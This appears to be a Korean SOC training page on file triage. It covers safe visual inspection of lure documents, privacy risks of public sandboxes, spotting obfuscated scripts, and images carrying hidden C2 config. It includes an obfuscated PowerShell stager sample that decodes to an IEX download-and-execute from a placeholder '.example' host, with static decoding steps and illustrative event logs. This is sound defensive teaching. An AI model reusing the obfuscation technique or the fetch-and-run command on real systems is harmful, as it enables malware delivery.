# 눈으로 살펴보기, 악성 스크립트, 악성코드를 돕는 파일 — 그리고 파일 분류 정리 { #inspection-summary }

!!! abstract "이 페이지에서 다루는 것"
    빠른 파일 분류의 마지막 도구들과, 호스트 파트 전체 정리입니다. 먼저 **눈으로 살펴보기**. 악성 문서는 사람이 한 번 보기만 해도 정체가 드러나는 경우가 많습니다. 하지만 내가 직접 열 수는 없으니, 아무것도 감염시키지 않고 화면을 얻는 방법(샌드박스, 되돌릴 수 있는 VM, 같은 방식으로 공격당하지 않는 OS에서 그려 보기)과, 공개 샌드박스 뒤에 숨은 큰 개인정보 문제를 봅니다. 다음은 **악성 스크립트**. 가장 쉬운 두 가지 표시, 즉 다른 코드를 내려받아 실행하기만 하는 스크립트와 난독화 도구를 거친 코드입니다. 무해한 난독화 PowerShell 시험 파일을 한 줄씩 뜯어보고, 실행하지 않고 정적으로 풀어 보고, 같은 스크립트가 4688과 4104 이벤트에서 어떻게 보이는지 봅니다. 그다음은 **그 자체로는 악성코드가 아니지만 악성코드를 돕는 파일**. 그림 파일이 스테가노그래피나 그냥 메타데이터를 통해 숨은 설정이나 명령 제어(C2) 메시지를 나르는 경우입니다. 시험용 JPEG에 가짜 설정을 숨기고 `file`, `exiftool`, `strings`, 헥스 보기로 다시 찾아냅니다. 사람들이 자주 걸려 넘어지는 엉뚱한 글자 하나도 함께 봅니다. 이어서 파일이 나쁠 수 있는지 빠르게 가리는 **다섯 가지 질문**, **호스트 파트 정리**(엔드포인트 공격과 방어, Windows·Linux 로그, 꼭 알아야 할 이벤트, 로그 파이프라인, 파일 분석), 그리고 팀의 리버스 엔지니어가 되고 싶다면 어디로 가면 되는지. 끝에 확인 문제와 해설이 있습니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, IP, 파일 이름은 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다. 시험 스크립트와 시험 그림 두 장은 이 페이지를 위해 분석 장비에서 만들었고, 그 파일들에 대한 Linux 출력은 모두 실제 출력입니다. 스크립트는 지어낸 `.example` 도메인만 가리키며 한 번도 실행하지 않았습니다. 샌드박스 보고서와 Windows 이벤트 XML은 설명용입니다. 모양은 실제와 같지만 값은 지어낸 것입니다. 이 페이지에는 실제 악성코드, 해시, 동작하는 익스플로잇 코드가 하나도 없습니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. **보는 게 가장 빠른 판정일 때가 많다.** 흐리게 처리된 "청구서"에 커다란 "콘텐츠 사용" 버튼이 있으면 미끼(lure)이고, 1초면 안다. 어려운 건 본 것을 판단하는 게 아니라, **중요한 기기에서 파일을 열지 않고** 보는 것이다.
2. **문서가 그걸 여는 무엇이든 감염시킨다고 가정한다.** 익스플로잇이 들었는지, 매크로인지, 링크뿐인지 모르니, 화면은 **샌드박스 스크린샷**이나 **나중에 되돌리는 스냅숏 VM**에서 얻는다.
3. **공개 샌드박스는 내가 준 것을 공개한다.** 무료 제출은 대개 모두에게 보인다. 공격자에게도, 우리 기관 이름을 검색하는 누구에게도. 흔한 스팸이면 괜찮지만 표적 공격이나 우리 데이터가 가득한 문서는 안 된다. 해시를 먼저 조회하고, 민감한 건 비공개나 사내 샌드박스를 쓴다.
4. **악성 스크립트는 작은 경우가 많다.** 하는 일이 **다른 걸 내려받아 실행하는 것뿐**인 스크립트, 특히 이상한 도메인에서 받는다면 그 자체로 들킨 거다. 공격자가 첫 단계를 작게 두는 건 잡힐 거리가 적고 진짜 페이로드가 첨부 파일에 들어 있지 않게 하려는 것이다.
5. **난독화는 시끄럽다.** 엉터리 변수 이름, 잘게 자른 문자열, 섞인 대소문자, 긴 Base64 덩어리, 마지막의 "이 문자열 실행" 호출은 스캐너를 피하려는 것이지만, 사람 눈에는 "누가 뭔가 숨긴다"고 외치는 것과 같다. 스크립트는 실행하지 않는 기기에서 `cat`, `less`, `strings`로 보고 정적으로 푼다.
6. **난독화는 호스트가 대신 풀어 준다.** PowerShell 스크립트 블록 로깅(이벤트 **4104**)은 블록을 컴파일하는 순간 기록하므로, 풀린 명령이 로그에 남는다. 누가 시작했는지는 **4688**/Sysmon 1, 어디로 접속했는지는 Sysmon 3/22와 함께 본다.
7. **"나쁜" 파일이 다 악성코드는 아니다.** 게시판이나 SNS에 올린 그림이 이미 실행 중인 악성코드에게 **설정이나 C2 명령**을 나를 수 있다. 픽셀 속에(**스테가노그래피**), 아니면 그냥 주석 같은 **메타데이터**에 숨긴다. 그림의 메타데이터에 코드나 Base64가 있다면, 무해하다고 가정해 줄 만한 설명은 없다.
8. **다섯 가지 질문**: 익스플로잇을 잘 나르는 형식인가? 해시와 서명으로 결론이 나나? 이 형식의 어떤 기능이 악용되나? 그 기능이 (안전하게 확인했을 때) 쓰이고 있나? 찾아낸 흔적(URL, 스크립트, 박힌 파일)은 무엇을 말하나?

## SOC에서 왜 중요한가 { #why }

앞 페이지들에서는 정밀한 도구를 배웠습니다. 매직 바이트, `strings`, `olevba`, `rtfobj`, `pdfid`, 해시와 서명. 바쁜 SOC에는 **빠른 길**도 필요합니다. 대부분의 경우를 1분 안에 끝내는 한두 가지 확인이요. 그래야 진짜 시간을 들여야 할 몇 건에 한 시간을 쓸 수 있습니다. 문서라면 그 빠른 길은 그냥 미끼를 *보는 것*인 경우가 많습니다. 스크립트라면 코드가 수상할 만큼 작거나 일부러 못 읽게 만들어졌다는 걸 알아채는 것이고요. 그리고 파일이 멀쩡해 보이는 경우(밈 그림, 휴가 사진)에도, 멀쩡해 보이는 파일이 침입의 일부일 수 있다는 걸 알아야 합니다. 그래야 "첨부가 그냥 그림이네" 하고 조사를 멈추지 않습니다.

이 페이지는 호스트 파트의 마지막이기도 합니다. 마지막 절에서는 호스트가 알려 줄 수 있는 것을 하나로 묶습니다. 엔드포인트가 어떻게 공격받고, 어떻게 방어되고, 그 로그가 어떻게 만들어져 옮겨지고, 거기 나타나는 파일을 어떻게 판단하는지.

## 눈으로 살펴보기 { #visual }

### 왜 보기만 해도 되나 { #visual-why }

피싱 문서는 스캐너가 아니라 **사람을 위해** 만들어집니다. 먹히려면 사람을 설득해서 무언가를 하게 해야 하죠. 편집 사용, 콘텐츠 사용, 버튼 클릭, QR 코드 스캔, 비밀번호 입력. 이 설득하는 층은 공격자가 가장 바꾸기 어려운 부분입니다. 피해자가 보기에 말이 돼야 하니까요. 그리고 분석가가 가장 빨리 알아보는 부분이기도 합니다.

- <strong>콘텐츠 사용(Enable Content)</strong>을 누르기 전까지 "보호됨"이나 "흐림" 상태인 문서. 가짜 제품 로고와 커다란 화살표 안내가 붙어 있는 경우가 많다.
- 내용이라고는 **문서 보기(View document)** 버튼이나 링크 하나뿐인 "청구서", "송금 내역", "배송 안내".
- 가짜 전자 서명이나 파일 공유 화면("보안 문서 1건이 도착했습니다").
- 급한 안내가 붙은 **QR 코드**("메일함을 유지하려면 스캔하세요").
- 글 한 줄과 `update.exe`나 `invoice.pdf`라고 적힌 **패키지 아이콘**(박힌 개체, [RTF 페이지](rtf-pdf-misc-triage.md) 참고).

공항 보안 검색대를 떠올려 보세요. X선(정적 분석 도구)은 가방 안에 금속이 있다는 건 알려 주지만, 겉의 운송장만 슬쩍 봐도 "고객님께"로 시작하고 존재하지 않는 회사에서 보낸 소포라는 걸 알 때가 많습니다. 문제는 그 소포를 터미널 한복판에서 뜯어 보면 안 된다는 거죠.

### 문제: 파일을 여는 것 자체가 공격이다 { #visual-risk }

내가 가진 문서가 **어떤 종류**인지는 미리 알 수 없습니다.

- 사용자가 무언가(링크, 매크로, 박힌 개체)를 누르기 전까지는 무해한 문서일 수도 있고,
- 보는 프로그램 자체를 노리는 **익스플로잇**(Office, PDF 리더, 그림 라이브러리의 버그)을 품고 있어서, 열기만 해도, 심지어 **미리 보기 창**에서도 터지는 문서일 수도 있습니다.

먼저 분석해 보기 전에는 어느 쪽인지 모르니, 안전한 가정은 최악의 경우입니다. **내 업무용 PC에서 열면 내 PC가 감염된다.** 그러니 할 일은 잃어도 되는 무언가로 문서의 화면을 얻는 것입니다.

### 의심 문서를 안전하게 보는 방법 { #visual-how }

| 방법 | 어떻게 하나 | 좋은 경우 | 조심할 점 |
| --- | --- | --- | --- |
| **스크린샷 찍는 샌드박스** | 샌드박스가 감시되는 일회용 VM에서 파일을 열고 스크린샷, 프로세스, 파일, 네트워크 트래픽을 기록 | 가장 빠르고 행위까지 덤으로 얻음 | 공개 서비스는 파일을 공개할 수 있음. 샌드박스를 알아채고 얌전히 있는 샘플도 있음 |
| **스냅숏 VM, 나중에 되돌리기** | 내 분석 VM, 격리 네트워크, 손으로 연 뒤 깨끗한 스냅숏으로 되돌림([안전한 취급](safe-handling-file-types.md#rule-vm) 참고) | 비공개 샘플, 미끼를 직접 눌러 보며 확인 | 규율이 필요함. VM이 업무망에 닿지 않게, 반드시 되돌리기 |
| **다른 플랫폼에서 그려 보기** | Linux 분석 장비의 일회용 컨테이너 안에서 이미지로 변환. PDF는 `pdftoppm`, 문서는 화면 없이 도는 오피스 프로그램 | Windows 프로그램을 돌리지 않고 문서 여러 개를 빨리 훑어보기 | 그리는 프로그램에도 버그가 있으니 그 장비는 노출된 걸로 본다. 매크로와 스크립트가 돌지 않으니 정적인 화면만 보임 |
| **글자만 보기** | 파일에 `strings`, `olevba`, `pdf-parser` | 그리지 않고 미끼 문구나 링크 읽기 | 배치가 사라짐. 정작 그 배치가 결정적 단서일 때가 많음 |

**[보충]** 실제로 쓰는 샌드박스. 오픈 소스이자 직접 설치하는 것으로는 **CAPE**(원래 Cuckoo에서 갈라져 나와 지금도 관리되는 후손, 페이로드와 설정 추출에 강함)와 **Cuckoo3**(CERT-EE가 관리하는 새로 쓴 버전)가 있습니다. 원래 Cuckoo Sandbox 2.x는 더 이상 관리되지 않고, 한때 가장 유명한 무료 Cuckoo 서비스였던 malwr.com은 사라진 지 몇 년 됐습니다. 온라인 서비스로는 Hybrid Analysis, ANY.RUN(대화형이라 미끼를 직접 눌러 볼 수 있음), Joe Sandbox, Triage가 있고, 대부분의 EDR과 이메일 보안 제품에도 샌드박스가 들어 있습니다. 우리 기관이 어느 요금제를 쓰는지 확인하세요. 그게 내 제출물을 누가 볼 수 있는지를 정합니다.

### 큰 "만약": 내 제출물을 누가 또 보나 { #visual-privacy }

무료나 커뮤니티 제출은 **공개**인 경우가 많습니다. 누구나 파일을 검색해 내려받고, 스크린샷이 담긴 보고서를 읽을 수 있습니다. 결과는 세 가지입니다.

1. **우리 데이터가 샌다.** 의심 첨부가 사실은 사용자가 전달한 진짜 계약서, 이력서, 내부 스프레드시트일 수 있습니다. 그 스크린샷이 이제 인터넷에 있습니다.
2. **공격자가 우리가 찾아냈다는 걸 안다.** 표적 공격을 하는 집단은 공개 서비스에서 자기 샘플을 지켜봅니다. 파일 안에 우리 기관 이름이 든 제출은 분명한 신호입니다.
3. **링크가 개인 맞춤일 수 있다.** 미끼는 URL에 받는 사람의 메일 주소를 넣는 경우가 많습니다. 공개 샌드박스가 그 링크를 따라가면, 공격자 서버는 이 주소의 주인이 조사하는 사람이라는 걸 알게 됩니다.

그래서 순서는 이렇습니다. **해시 조회가 먼저**(내용은 전혀 드러나지 않음, [해시](hashing-signatures.md#hash-lookup) 참고), 그다음 **비공개** 샌드박스나 내 VM, 공개 제출은 누가 봐도 흔한 샘플일 때만, 그리고 정책이 허락할 때만.

### 샌드박스 결과 읽기 { #visual-report }

`Remittance_0412.docx`라는 첨부에 대한 설명용(지어낸) 요약입니다.

```text
File          Remittance_0412.docx   (Microsoft Word 2007+)
SHA-256       9a41c6...e07b  (not seen before this submission)
Verdict       Malicious (score 88/100)
Screenshot 1  Word: yellow bar "PROTECTED VIEW ... Enable Editing"
Screenshot 2  Page image: blurred invoice, banner "This document is protected.
              Click ENABLE CONTENT to view"
Processes     WINWORD.EXE (2840)
              └─ (no child processes; macros did not run in Protected View)
Network       none
Static        olevba: VBA macros: Yes, AutoExec: Document_Open
              URL in document.xml.rels: https://docs-portal.example/view?u=c.kim@corp.example
Signatures    Office document with auto-executing macro; lure image asks to enable content
```

- `Microsoft Word 2007+` — 샌드박스가 확장자가 아니라 바이트로 알아낸 형식(OOXML ZIP)입니다.
- `not seen before this submission` — 처음 보는 해시입니다. 평판이 어느 쪽으로도 없고, 이 제출이 이 파일의 첫 공개 흔적일 수 있습니다.
- `Screenshot 1`과 `2` — 미끼입니다. 제한된 보기(Protected View)로 열려서 Word가 노란 막대를 보여 줍니다. 페이지 자체는 흐린 청구서 **그림**에 안내 문구를 얹은 것입니다. 진짜 청구서는 읽으려고 콘텐츠를 사용할 필요가 없으니, 이것만으로도 악성이라고 부르기 충분합니다.
- `Processes` — **자식 프로세스가 없습니다.** 무해하다는 뜻이 아닙니다. 아무도 콘텐츠 사용을 누르지 않아서 매크로가 안 돌았을 뿐입니다. 많은 샌드박스는 자동으로 눌러 주도록 설정할 수 있습니다. 문서의 프로세스 트리가 조용하면 "무해함"이 아니라 "안 터졌음"으로 읽습니다.
- `olevba ... AutoExec: Document_Open` — 정적 검사로 문서가 열릴 때 도는 매크로가 있다는 게 확인됩니다([`olevba`](safe-handling-file-types.md#olevba) 참고).
- `URL ... u=c.kim@corp.example` — **받는 사람 주소가 박힌** 링크입니다. 회사 IP에서 들어가 보지 말고, IOC(도메인 `docs-portal.example`)로 적어 둡니다.
- SOC의 판단: 악성 미끼. 도메인과 해시를 차단하고, 같은 메일을 받은 다른 사람을 찾고, 누군가 콘텐츠를 사용했는지 확인합니다(어느 호스트든 4688이나 Sysmon 1에 `WINWORD.EXE`의 자식 프로세스가 있는지).

## 악성 스크립트 알아보기 { #scripts }

### 쉬운 표시 두 가지 { #scripts-tells }

스크립트(`.js`, `.vbs`, `.ps1`, `.hta`, `.bat`, `.cmd`)는 글자로 된 파일이라 실행 파일과 달리 **읽을 수** 있습니다. 실행하지 않는 기기에서 읽기만 한다면요. 악성 스크립트 대부분은 두 가지 패턴으로 잡힙니다.

**1. 아주 작고, 하는 일은 코드를 더 받아 와서 실행하는 것뿐이다.** 첫 단계 스크립트는 "이 URL에서 받아서 실행해" 말고는 아무것도 없는 경우가 많습니다. 공격자 입장에서는 영리한 방법입니다.

- 스캐너가 알아볼 거리가 거의 없습니다. 내려받기는 정상 스크립트도 하는 일이니까요.
- 진짜 악성코드(두 번째 단계)는 메일에 실려 오지 않습니다. 그래서 첨부가 잡혀도 방어 쪽은 페이로드를 손에 넣지 못하고, 그 페이로드에 대한 백신 시그니처도 늦게 나옵니다.
- 공격자는 서버의 페이로드를 언제든 바꿀 수 있고, 진짜 표적처럼 보이는 곳(맞는 나라, 샌드박스 아님)에만 줄 수도 있습니다.

그러니 내려받아 실행하기만 하는 스크립트는, 특히 이상하거나 새로 생겼거나 닮은꼴인 도메인에서 받는다면, 그것만으로 강한 신호입니다. ATT&CK로는 명령 해석기(**T1059.001 PowerShell**, **T1059.005 Visual Basic**, **T1059.007 JavaScript**)가 돌리는 **T1105 Ingress Tool Transfer**입니다.

**2. 난독화 도구를 거쳤다.** 악성 스크립트는 보통 모든 이름을 엉터리로 바꾸고, 문자열을 조각내고, 대소문자를 섞고, 일부를 Base64나 문자 코드로 바꾸고, 진짜 명령을 실행 중에 조립하는 도구를 거칩니다(**T1027.010 Command Obfuscation**). 목적은 `DownloadString`이나 `WScript.Shell` 같은 키워드를 찾는 자동 스캐너와 메일 필터를 피하는 것입니다. 아이러니하게도 이게 사람의 일은 **더 쉽게** 만듭니다. 평범한 관리자는 잡지에서 오려 붙인 협박 편지 같은 코드를 쓰지 않으니까요.

### 스크립트를 안전하게 보기 { #scripts-view }

규칙은 이렇습니다.

- **절대 더블클릭하지 않는다.** Windows에서 `.js`, `.vbs`, `.hta`, 그리고 (설정에 따라) `.ps1`을 더블클릭하면 실행됩니다.
- **실행할 수 없는 OS에서 읽거나**, 적어도 글자만 보여 주는 도구로 읽는다. `cat`, `less`, `strings`, 문법 강조가 되는 편집기. Linux 분석 장비에서는 Windows 스크립트가 할 수 있는 게 거의 없습니다.
- **`file`이 정체를 알려 주리라 믿지 않는다.** 스크립트는 그냥 글자라서 `file`은 `ASCII text`라고만 하는 경우가 많습니다. 직접 읽어야 합니다.

### 실습: 난독화된 PowerShell 스테이저 { #scripts-example }

이 페이지를 위해 만든 무해한 시험 파일입니다(지어낸 `.example` 도메인만 가리키고, 한 번도 실행하지 않았습니다).

```text
$ file invoice_0412.ps1
invoice_0412.ps1: ASCII text
$ wc -c invoice_0412.ps1
402 invoice_0412.ps1
$ cat invoice_0412.ps1
$qZx7 = 'Sy'+'stEm.'+'TeXt.'+'EnCo'+'DiNg'
$Lp0w = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"
$Lp0w += "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHMAeQBuAGMALgBlAHgAYQBtAHAAbABlAC8AcwAyACcAKQA="
$vR = [TyPe]($qZx7)
$kD9 = $vR::Unicode.GetString([Convert]::('FromB'+'ase64String').Invoke($Lp0w))
& ([ScriptBlock]::Create($kD9))
```

먼저 빠른 사실 두 가지. `file`은 `ASCII text`라고만 합니다. PowerShell이라는 힌트도, 악성이라는 힌트도 없습니다. 그리고 전체가 **402바이트**입니다. 청구서 내용은 하나도 없는 "청구서"죠. 이제 한 줄씩 봅니다.

- `$qZx7 = 'Sy'+'stEm.'+'TeXt.'+'EnCo'+'DiNg'` — 아무 뜻 없는 이름의 변수에, 대소문자가 뒤죽박죽인 다섯 조각을 이어 붙인 문자열을 넣습니다. 합치면 `System.Text.Encoding`, 바이트를 글자로 바꿔 주는 .NET 클래스입니다. PowerShell의 형식 이름은 대소문자를 가리지 않아서 이상한 대소문자로도 잘 돌아가지만, 정확히 `System.Text.Encoding`이라는 글자를 찾는 스캐너는 놓칩니다. 해롭지도 않은 클래스 이름을 쪼갠 건 순전히 **스캐너 피하기**입니다.
- `$Lp0w = "SQBFAFgA..."`와 `$Lp0w += "AEMAbABp..."` — 긴 Base64 문자열을 두 줄로 나눠 `+=`로 잇습니다. 이렇게 나누면 어느 한 줄에도 인코딩된 명령 전체가 들어 있지 않습니다. 한 글자 건너 하나씩 반복되는 `A`(`SQBFAFgAIAAo...`)는 Base64로 인코딩한 **UTF-16LE 글자**의 지문입니다. ASCII 글자 하나가 그 글자 + 0 바이트가 되고, 0 바이트가 Base64에서 `A`로 나타나기 때문입니다([Base64](../http-analysis/base64.md), [인코딩](file-identification.md#unicode) 참고).
- `$vR = [TyPe]($qZx7)` — 문자열 `System.Text.Encoding`을 실제 형식으로 바꿉니다. 그래서 스크립트는 클래스 이름을 한 번도 통째로 쓰지 않고 그 클래스를 씁니다.
- `$kD9 = $vR::Unicode.GetString([Convert]::('FromB'+'ase64String').Invoke($Lp0w))` — 푸는 단계입니다. `[Convert]::FromBase64String`은 Base64를 바이트로 바꾸는데, 메서드 이름을 또 쪼개고(`'FromB'+'ase64String'`) `.Invoke(...)`로 부르니 `FromBase64String`이라는 키워드는 어디에도 나오지 않습니다. 이어서 `Unicode.GetString`이 그 바이트를 UTF-16LE 글자로 읽습니다. 그 결과, 진짜 명령이 `$kD9`에 들어갑니다.
- `& ([ScriptBlock]::Create($kD9))` — 풀어 낸 문자열을 코드로 컴파일해서 실행합니다(`&`는 호출 연산자). 이 마지막 줄이 "**방금 만든 문자열을 실행해**" 패턴이고, 스테이저의 가장 확실한 표시입니다. 비슷한 것으로 `Invoke-Expression`/`IEX`, `.Invoke()`, JavaScript의 `eval(`, VBScript의 `Execute`/`ExecuteGlobal`이 있습니다.

PowerShell을 아예 돌리지 않고, 분석 장비에서 **정적으로** 풀어 봅니다.

```text
$ grep -oE '"[A-Za-z0-9+/=]+"' invoice_0412.ps1 | tr -d '"\n' | base64 -d | iconv -f UTF-16LE
IEX (New-Object Net.WebClient).DownloadString('https://cdn-sync.example/s2')
```

- `grep -oE '"[A-Za-z0-9+/=]+"'` — 큰따옴표로 감싼 Base64 글자 덩어리만 뽑습니다(`$Lp0w`의 두 조각). `-o`는 일치한 부분만, `-E`는 확장 패턴을 켭니다.
- `tr -d '"\n'` — 따옴표와 조각 사이의 줄바꿈을 지웁니다. 그러면 `+=`가 했던 것처럼 하나의 문자열로 다시 붙습니다.
- `base64 -d` — Base64를 바이트로 풉니다.
- `iconv -f UTF-16LE` — 그 바이트를 UTF-16LE로 해석해 보통 글자로 찍습니다. 이 단계를 빼면 글자 사이사이에 보이지 않는 0 바이트가 낀 채로 나옵니다.
- 출력이 이 스크립트의 존재 이유 전부입니다. `https://cdn-sync.example/s2`에서 글자를 내려받아 `IEX`(`Invoke-Expression`)로 실행. 아무도 모르는 도메인에서 코드를 받아 실행하는 게 유일한 일인 402바이트짜리 "청구서". 표시 1번과 표시 2번이 한 파일에 다 있습니다.

**[보충]** CyberChef("From Base64" 다음 "Decode text: UTF-16LE")로 브라우저에서 똑같이 할 수 있어서, Windows 분석 장비에서 편합니다. 여러 겹으로 싼 샘플은 반복합니다. 한 겹 풀고, 읽고, 다음 겹을 풉니다. 마지막 `&`/`IEX`를 `Write-Output`으로 바꿔 아끼는 기기에서 돌리는 식으로 "풀지" 마세요. 한 겹만 놓쳐도 페이로드를 실행해 버립니다.

### 스크립트에 대한 다른 빠른 확인 { #scripts-checks }

- **서명됐나?** PowerShell, VBScript, JScript 파일은 끝에 주석 덩어리로 Authenticode 서명을 달 수 있습니다(`.ps1`이면 `# SIG # Begin signature block`). 우리 기관의 코드 서명 인증서로 서명된 내부 관리 스크립트라면 좋은 신호입니다. 낯선 사람이 서명한 스크립트는 그냥 서명된 스크립트일 뿐입니다([서명됐으면 안전한가](hashing-signatures.md#signed-safe) 참고).
- **해시 조회.** 흔한 스크립트는 이미 알려진 경우가 많습니다. 다만 난독화 도구는 메일마다 새 변종을 만들 수 있어서, 스크립트는 "처음 봄"이 보통이라는 걸 기억하세요.
- **부르는 곳의 평판.** 풀어 낸 명령 속 도메인이나 IP가 가장 좋은 IOC일 때가 많습니다. 새로 등록됐는지, 닮은꼴인지, 무료 호스팅인지([URL 평판](../http-analysis/evil-http-and-reputation.md) 참고).
- **어디서 왔나?** 메일로 온 ZIP 안의 `.js`를 `%TEMP%\Temp1_*.zip`에서 `wscript.exe`가 열었다면, 대부분의 기관에서는 업무상 이유가 없습니다([스크립트와 해석기](safe-handling-file-types.md#scripts) 참고).

**[주의]** 난독화가 곧 악성이라는 증거는 아닙니다. 상용 웹 코드는 줄이고(minify) 보호하려고 난독화하기도 하고, 라이선스 도구는 로직을 숨기고, 어떤 관리 에이전트는 Base64로 인코딩한 PowerShell을 씁니다. 얼마나 못생겼는지가 아니라, 풀어 낸 코드가 **무엇을 하는지**와 파일이 어디서 왔는지로 판단하세요.

### 같은 스크립트가 로그에서는 { #scripts-logs }

사용자가 이 파일을 실행했다면 호스트는 여러 층에서 기록을 남깁니다. 설명용 4688(프로세스 생성, [프로세스 생성](../important-events/process-creation.md) 참고)입니다.

```text
EventID          4688
NewProcessName   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine      "powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\c.kim\Downloads\invoice_0412.ps1"
ParentProcessName C:\Windows\explorer.exe
SubjectUserName  c.kim
```

- **4688**은 새 프로세스가 시작될 때마다 생깁니다(명령줄 감사를 켜 두면 전체 명령줄도 담깁니다). 공격자가 신경 쓰는 이유는, 실행하는 도구마다 하나씩 남기 때문입니다. 그래서 공격자들은 이미 있는 프로세스 안에 숨어 지내는 걸 좋아합니다.
- `-ExecutionPolicy Bypass -File ...\Downloads\invoice_0412.ps1` — 실행 정책은 안전벨트일 뿐 보안 경계가 아니고, 누구나 프로세스 단위로 우회할 수 있습니다. 다운로드 폴더의 "청구서"가 스크립트로 실행됐다는 것 자체가 경보입니다.
- `ParentProcessName explorer.exe` — 사용자가 직접 시작했습니다(더블클릭이나 오른쪽 클릭 > PowerShell로 실행). **T1204.002 User Execution: Malicious File**입니다.

다음은 `Microsoft-Windows-PowerShell/Operational`의 **4104**(스크립트 블록 로깅, 칸별 설명은 [PowerShell 로그](../important-events/accounts-defender-powershell.md#4104) 참고)입니다. 스크립트가 풀어 낸 문자열로 **새** 스크립트 블록을 컴파일하니, 블록이 둘 생깁니다. 먼저 쓰인 그대로의 파일(`Path`에 `.ps1` 경로), 그리고 이것입니다.

```xml
<EventID>4104</EventID>
<Level>3</Level>
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('https://cdn-sync.example/s2')</Data>
<Data Name="ScriptBlockId">4e7d0c2a-93b1-4f6e-a8d2-71c5e0b39f14</Data>
<Data Name="Path"></Data>
```

- `ScriptBlockText` — 풀린 명령이 평문으로 있습니다. 내가 아무것도 풀 필요가 없었습니다. PowerShell은 실행하려면 문자열을 코드로 바꿔야 하고, 4104가 기록하는 게 바로 그 순간이니까요. 그다음 `s2` 자체도 4104 블록으로 줄줄이 들어옵니다. 디스크에는 한 번도 닿지 않았는데도요.
- `Level 3`(경고) — PowerShell은 `DownloadString` 같은 수상한 단어가 든 블록을 표시해 두고, **스크립트 블록 로깅을 켜지 않았어도** 기록합니다. 공짜 안전망이지만 거기에 기대지 말고 전체 로깅을 켜세요.
- `Path`가 비어 있음 — 이 블록은 파일이 아니라 실행 중에 만든 문자열에서 왔습니다.

네트워크 증거가 그림을 완성합니다. `cdn-sync.example`에 대한 Sysmon 22(DNS 질의), `powershell.exe`에서 그 주소로 가는 Sysmon 3(네트워크 연결), 그리고 다운로드를 보여 주는 프록시 로그. Defender의 AMSI(Antimalware Scan Interface)가 풀린 블록을 검사해서 알아봤다면 `powershell.exe`를 프로세스로 적은 Defender 탐지 이벤트(1116)도 보입니다([Defender 이벤트](../important-events/accounts-defender-powershell.md#1116) 참고).

## 악성 행위에 보탬이 되는 파일들 { #supporting }

### 나쁘지만, 그 자체로 악성은 아닌 { #supporting-what }

침입에 쓰인 파일이 다 악성코드인 건 아닙니다. 어떤 파일은 그냥 **이미 실행 중인 악성코드에게 보내는 메시지**입니다. 그림은 설정 데이터와 C2 명령을 나르는 단골 수단입니다. 이렇게 돌아갑니다.

1. 공격자가 악성코드를 만들 때 **확인할 장소**를 박아 넣습니다. 게시판 글, SNS 계정, 이미지 호스팅 페이지, 공개 코드 저장소. 그리고 피해자를 그 악성코드로 감염시킵니다.
2. 실행 중인 악성코드가 그곳에 올라온 그림을 **주기적으로 내려받습니다.** 네트워크에서 보면 유명 웹사이트에 가는 평범한 HTTPS 요청이라 일반 웹 서핑과 구분하기가 아주 어렵습니다.
3. 이미 푸는 방법을 품고 있는 악성코드가 그림에서 **숨은 메시지를 꺼냅니다.** 새 C2 주소, 명령, 설정 변경.

핵심은 그림이 **혼자서는 아무것도 하지 않는다**는 점입니다. 그림 보기 프로그램으로 열면 그냥 그림입니다. 이미 그 기기에 있는 악성코드에게만 "먹힙니다". 매일 아침 특정 게시판을 확인하는 스파이를 떠올려 보세요. 다른 사람에게는 평범한 전단지지만, 스파이는 구석의 빨간 압정이 "오늘 밤 만나자"라는 뜻이라는 걸 압니다. ATT&CK로는 **T1102 Web Service**, 게시물이 진짜 C2 서버가 어디인지만 알려 주는 경우는 특히 **T1102.001 Dead Drop Resolver**이고, 숨기는 부분은 **T1001.002 Data Obfuscation: Steganography**입니다.

잘 알려진 공개 사례로 2018년에 SNS 계정에 올라온 밈 그림을 읽어 명령을 풀어 내는 악성코드가 있었습니다. 공개 이미지 호스팅 서비스의 그림 메타데이터 주석에 Base64로 인코딩한 지시를 넣은 사례도 있었습니다.

### 그림에 데이터를 숨기는 두 가지 방법 { #supporting-how }

- <strong>스테가노그래피(steganography)</strong>: 메시지를 **그림 데이터 자체**에 숨깁니다. 보통 픽셀 값의 가장 낮은 비트를 바꿉니다(색 값 200이 201이 돼도 눈으로는 모릅니다). 그림은 똑같아 보이고, 파일 크기도 거의 안 변하고, `strings`로는 메시지를 못 찾습니다. 탐지하기가 정말 어렵고, 공개 보고서에 나오는 빈도로 보면 우리가 알아채는 것보다 흔합니다. 2025년에는 여러 캠페인에서 로더가 다음 단계를 PNG 픽셀에 숨겼고, 가짜 업데이트 화면이나 가짜 CAPTCHA 화면을 쓴 캠페인도 있었습니다. 파일에 페이로드를 숨기는 스테가노그래피 기법은 **T1027.003**입니다.
- <strong>메타데이터(metadata)</strong>: 그림이 원래 가진 칸에 메시지를 그냥 넣습니다. JPEG 주석, 카메라 제조사·작가·설명 같은 EXIF 칸, PNG 텍스트 덩어리. 평소에는 카메라 모델이나 GPS 위치가 들어가는 자리에 인코딩된 URL, IP 주소, 아예 스크립트 전체가 들어갑니다. 사진 뒷면에 메모를 적는 것과 같습니다. 뒤집어 보는 사람은 누구나 읽을 수 있고, 그래서 우리가 찾기 쉽습니다.

### 실습: JPEG 주석에 숨긴 설정 { #supporting-example }

이 페이지를 위해 만든 무해한 시험 그림 두 장입니다. `holiday.jpg`(평범한 카메라 메타데이터)와 `meme_0412.jpg`(같은 그림에 주석 칸에 "설정"을 숨김). 둘 다 열면 파란 바탕에 흰 동그라미입니다.

```text
$ file meme_0412.jpg
